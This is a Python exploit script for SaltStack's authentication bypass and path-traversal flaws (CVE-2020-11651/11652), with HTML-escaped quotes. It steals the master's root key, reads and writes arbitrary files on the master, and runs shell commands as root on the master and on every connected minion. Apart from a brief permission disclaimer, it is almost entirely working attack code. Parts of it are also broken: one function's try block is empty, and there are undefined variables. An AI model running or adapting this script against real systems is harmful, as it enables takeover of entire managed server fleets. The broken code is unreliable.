# Exploit Author: Jasper Lievisse Adriaanse
# Vendor Homepage: https://www.saltstack.com/
# Version: < 3000.2, < 2019.2.4, 2017.*, 2018.*
# Tested on: Debian 10 with Salt 2019.2.0
# CVE : CVE-2020-11651 and CVE-2020-11652
# Discription: Saltstack authentication bypass/remote code execution
#
# Source: https://github.com/jasperla/CVE-2020-11651-poc
# This exploit is based on this checker script:
# https://github.com/rossengeorgiev/salt-security-backports

#!/usr/bin/env python
#
# Exploit for CVE-2020-11651 and CVE-2020-11652
# Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)
# This exploit is based on this checker script:
# https://github.com/rossengeorgiev/salt-security-backports

from __future__ import absolute_import, print_function, unicode_literals
import argparse
import datetime
import os
import os.path
import sys
import time

import salt
import salt.version
import salt.transport.client
import salt.exceptions

def init_minion(master_ip, master_port):
    minion_config = {
        &#039;transport&#039;: &#039;zeromq&#039;,
        &#039;pki_dir&#039;: &#039;/tmp&#039;,
        &#039;id&#039;: &#039;root&#039;,
        &#039;log_level&#039;: &#039;debug&#039;,
        &#039;master_ip&#039;: master_ip,
        &#039;master_port&#039;: master_port,
        &#039;auth_timeout&#039;: 5,
        &#039;auth_tries&#039;: 1,
        &#039;master_uri&#039;: &#039;tcp://{0}:{1}&#039;.format(master_ip, master_port)
    }

    return salt.transport.client.ReqChannel.factory(minion_config, crypt=&#039;clear&#039;)

# --- check funcs ----

def check_salt_version():
  print("[+] Salt version: {}".format(salt.version.__version__))

  vi = salt.version.__version_info__

  if (vi < (2019, 2, 4) or (3000,) <= vi < (3000, 2)):
     return True
  else:
     return False

def check_connection(master_ip, master_port, channel):
  print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end=&#039;&#039;)
  sys.stdout.flush()

  # connection check
  try:
    channel.send({&#039;cmd&#039;:&#039;ping&#039;}, timeout=2)
  except salt.exceptions.SaltReqTimeoutError:
    print("OFFLINE")
    sys.exit(1)
  else:
    print("ONLINE")

def check_CVE_2020_11651(channel):
  print("[+] Checking if vulnerable to CVE-2020-11651... ", end=&#039;&#039;)
  sys.stdout.flush()
  # try to evil
  try:
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
      pass
  finally:
    if rets:
      root_key = rets[2][&#039;root&#039;]
      return root_key

  return None

def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read_token)... ", end=&#039;&#039;)
  sys.stdout.flush()

  # try read file
  msg = {
    &#039;cmd&#039;: &#039;get_token&#039;,
    &#039;arg&#039;: [],
    &#039;token&#039;: top_secret_file_path,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    print("NO")
  
def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read)... ", end=&#039;&#039;)
  sys.stdout.flush()

  # try read file
  msg = {
    &#039;key&#039;: root_key,
    &#039;cmd&#039;: &#039;wheel&#039;,
    &#039;fun&#039;: &#039;file_roots.read&#039;,
    &#039;path&#039;: top_secret_file_path,
    &#039;saltenv&#039;: &#039;base&#039;,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets[&#039;data&#039;][&#039;return&#039;]:
      print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write1(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write1)... ", end=&#039;&#039;)
  sys.stdout.flush()

  # try read file
  msg = {
    &#039;key&#039;: root_key,
    &#039;cmd&#039;: &#039;wheel&#039;,
    &#039;fun&#039;: &#039;file_roots.write&#039;,
    &#039;path&#039;: &#039;../../../../../../../../tmp/salt_CVE_2020_11652&#039;,
    &#039;data&#039;: &#039;evil&#039;,
    &#039;saltenv&#039;: &#039;base&#039;,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)

    pp(rets)
    if rets[&#039;data&#039;][&#039;return&#039;].startswith(&#039;Wrote&#039;):
      try:
        os.remove(&#039;/tmp/salt_CVE_2020_11652&#039;)
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write2(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write2)... ", end=&#039;&#039;)
  sys.stdout.flush()

  # try read file
  msg = {
    &#039;key&#039;: root_key,
    &#039;cmd&#039;: &#039;wheel&#039;,
    &#039;fun&#039;: &#039;config.update_config&#039;,
    &#039;file_name&#039;: &#039;../../../../../../../../tmp/salt_CVE_2020_11652&#039;,
    &#039;yaml_contents&#039;: &#039;evil&#039;,
    &#039;saltenv&#039;: &#039;base&#039;,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets[&#039;data&#039;][&#039;return&#039;].startswith(&#039;Wrote&#039;):
      try:
        os.remove(&#039;/tmp/salt_CVE_2020_11652.conf&#039;)
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def pwn_read_file(channel, root_key, path, master_ip):
    print("[+] Attemping to read {} from {}".format(path, master_ip))
    sys.stdout.flush()

    msg = {
        &#039;key&#039;: root_key,
        &#039;cmd&#039;: &#039;wheel&#039;,
        &#039;fun&#039;: &#039;file_roots.read&#039;,
        &#039;path&#039;: path,
        &#039;saltenv&#039;: &#039;base&#039;,
    }

    rets = channel.send(msg, timeout=3)
    print(rets[&#039;data&#039;][&#039;return&#039;][0][path])

def pwn_upload_file(channel, root_key, src, dest, master_ip):
    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))
    sys.stdout.flush()

    try:
        fh = open(src, &#039;rb&#039;)
        payload = fh.read()
        fh.close()
    except Exception as e:
        print(&#039;[-] Failed to read {}: {}&#039;.format(src, e))
        return

    msg = {
        &#039;key&#039;: root_key,
        &#039;cmd&#039;: &#039;wheel&#039;,
        &#039;fun&#039;: &#039;file_roots.write&#039;,
        &#039;saltenv&#039;: &#039;base&#039;,
        &#039;data&#039;: payload,
        &#039;path&#039;: dest,
    }

    rets = channel.send(msg, timeout=3)
    print(&#039;[ ] {}&#039;.format(rets[&#039;data&#039;][&#039;return&#039;]))

def pwn_exec(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute {} on {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        &#039;key&#039;: root_key,
        &#039;cmd&#039;: &#039;runner&#039;,
        &#039;fun&#039;: &#039;salt.cmd&#039;,
        &#039;saltenv&#039;: &#039;base&#039;,
        &#039;user&#039;: &#039;sudo_user&#039;,
        &#039;kwarg&#039;: {
            &#039;fun&#039;: &#039;cmd.exec_code&#039;,
            &#039;lang&#039;: &#039;python&#039;,
            &#039;code&#039;: "import subprocess;subprocess.call(&#039;{}&#039;,shell=True)".format(cmd)
        },
        &#039;jid&#039;: jid,
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print(&#039;[-] Failed to submit job&#039;)
        return

    if rets.get(&#039;jid&#039;):
        print(&#039;[+] Successfully scheduled job: {}&#039;.format(rets[&#039;jid&#039;]))

def pwn_exec_all(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute &#039;{}&#039; on all minions connected to {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        &#039;key&#039;: root_key,
        &#039;cmd&#039;: &#039;_send_pub&#039;,
        &#039;fun&#039;: &#039;cmd.run&#039;,
        &#039;user&#039;: &#039;root&#039;,
        &#039;arg&#039;: [ "/bin/sh -c &#039;{}&#039;".format(cmd) ],
        &#039;tgt&#039;: &#039;*&#039;,
        &#039;tgt_type&#039;: &#039;glob&#039;,
        &#039;ret&#039;: &#039;&#039;,
        &#039;jid&#039;: jid
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print(&#039;[-] Failed to submit job&#039;)
        return
    finally:
        if rets == None:
            print(&#039;[+] Successfully submitted job to all minions.&#039;)
        else:
            print(&#039;[-] Failed to submit job&#039;)


def main():
    parser = argparse.ArgumentParser(description=&#039;Saltstack exploit for CVE-2020-11651 and CVE-2020-11652&#039;)
    parser.add_argument(&#039;--master&#039;, &#039;-m&#039;, dest=&#039;master_ip&#039;, default=&#039;127.0.0.1&#039;)
    parser.add_argument(&#039;--port&#039;, &#039;-p&#039;, dest=&#039;master_port&#039;, default=&#039;4506&#039;)
    parser.add_argument(&#039;--force&#039;, &#039;-f&#039;, dest=&#039;force&#039;, default=False, action=&#039;store_false&#039;)
    parser.add_argument(&#039;--debug&#039;, &#039;-d&#039;, dest=&#039;debug&#039;, default=False, action=&#039;store_true&#039;)
    parser.add_argument(&#039;--run-checks&#039;, &#039;-c&#039;, dest=&#039;run_checks&#039;, default=False, action=&#039;store_true&#039;)
    parser.add_argument(&#039;--read&#039;, &#039;-r&#039;, dest=&#039;read_file&#039;)
    parser.add_argument(&#039;--upload-src&#039;, dest=&#039;upload_src&#039;)
    parser.add_argument(&#039;--upload-dest&#039;, dest=&#039;upload_dest&#039;)
    parser.add_argument(&#039;--exec&#039;, dest=&#039;exec&#039;, help=&#039;Run a command on the master&#039;)
    parser.add_argument(&#039;--exec-all&#039;, dest=&#039;exec_all&#039;, help=&#039;Run a command on all minions&#039;)
    args = parser.parse_args()

    print("[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.")
    time.sleep(1)

    # Both src and destination are required for uploads
    if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):
        print(&#039;[-] Must provide both --upload-src and --upload-dest&#039;)
        sys.exit(1)

    channel = init_minion(args.master_ip, args.master_port)

    if check_salt_version():
       print("[ ] This version of salt is vulnerable! Check results below")
    elif args.force:
       print("[*] This version of salt does NOT appear vulnerable. Proceeding anyway as requested.")
    else:
       sys.exit()

    check_connection(args.master_ip, args.master_port, channel)
    
    root_key = check_CVE_2020_11651(channel)
    if root_key:
        print(&#039;\n[*] root key obtained: {}&#039;.format(root_key))
    else:
        print(&#039;[-] Failed to find root key...aborting&#039;)
        sys.exit(127)

    if args.run_checks:
        # Assuming this check runs on the master itself, create a file with "secret" content
        # and abuse CVE-2020-11652 to read it.
        top_secret_file_path = &#039;/tmp/salt_cve_teta&#039;
        with salt.utils.fopen(top_secret_file_path, &#039;w&#039;) as fd:
            fd.write("top secret")

        # Again, this assumes we&#039;re running this check on the master itself
        with salt.utils.fopen(&#039;/var/cache/salt/master/.root_key&#039;) as keyfd:
            root_key = keyfd.read()

        check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)
        check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)
        check_CVE_2020_11652_write1(debug, channel, root_key)
        check_CVE_2020_11652_write2(debug, channel, root_key)
        os.remove(top_secret_file_path)
        sys.exit(0)

    if args.read_file:
        pwn_read_file(channel, root_key, args.read_file, args.master_ip)

    if args.upload_src:
        if os.path.isabs(args.upload_dest):
            print(&#039;[-] Destination path must be relative; aborting&#039;)
            sys.exit(1)
        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)


    jid = &#039;{0:%Y%m%d%H%M%S%f}&#039;.format(datetime.datetime.utcnow())

    if args.exec:
        pwn_exec(channel, root_key, args.exec, args.master_ip, jid)

    if args.exec_all:
        print("[!] Lester, is this what you want? Hit ^C to abort.")
        time.sleep(2)
        pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)


if __name__ == &#039;__main__&#039;:
    main()

